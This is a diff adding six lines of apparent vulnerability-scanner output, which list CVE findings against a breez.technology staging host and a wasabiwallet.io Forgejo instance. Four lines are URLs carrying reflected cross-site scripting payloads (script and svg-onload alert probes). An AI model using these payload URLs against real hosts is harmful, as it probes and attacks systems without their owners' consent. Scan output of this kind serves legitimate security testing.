@@ -1,0 +1,6 @@
+[CVE-2019-1010287] [http] [medium] https://lq1-staging.breez.technology/timesheet/login.php
+[CVE-2018-13380] [http] [medium] https://lq1-staging.breez.technology/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+[CVE-2018-13380] [http] [medium] https://lq1-staging.breez.technology/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
+[CVE-2005-4385] [http] [medium] https://lq1-staging.breez.technology/search.htm?searchstring2&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[forgejo-repo-exposure] [http] [medium] https://git.wasabiwallet.io/explore/repos
+[CVE-2015-8349] [http] [medium] https://lq1-staging.breez.technology/index.php?p=banlist&advSearch=0%27%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&advType=btype
